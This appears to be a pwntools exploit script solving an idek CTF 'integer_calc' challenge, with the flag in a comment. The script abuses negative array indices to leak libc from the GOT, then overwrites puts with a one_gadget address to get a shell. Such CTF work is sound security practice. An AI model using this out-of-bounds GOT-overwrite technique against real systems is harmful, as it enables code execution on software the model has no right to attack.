# idek{GU355_1_n33d_t0_r34d_Ab0ut_51gness}
from pwn import *

elf = ELF("./integer_calc")
libc = elf.libc

target = process([elf.path])
target = remote("arithmetic-calculator.chal.idek.team", 1337)

def sla(s, d):
    target.sendlineafter(s, str(d))

def store(idx, num):
    sla(">", 0)
    sla(":", idx)
    sla(":", num)

def add(idx1, idx2):
    sla(">", 2)
    sla(":", idx1)
    sla(":", idx2)
    target.recvuntil(": ")
    return int(target.recvline().strip(), 10)

libc.address = add((- elf.sym['numbers'] + elf.got['printf'])/8, 0) - libc.sym['printf']
log.info("LIBC Base: " + hex(libc.address))

store((- elf.sym['numbers'] + elf.got['puts'])/8, libc.address + 0xe6c81)

target.interactive()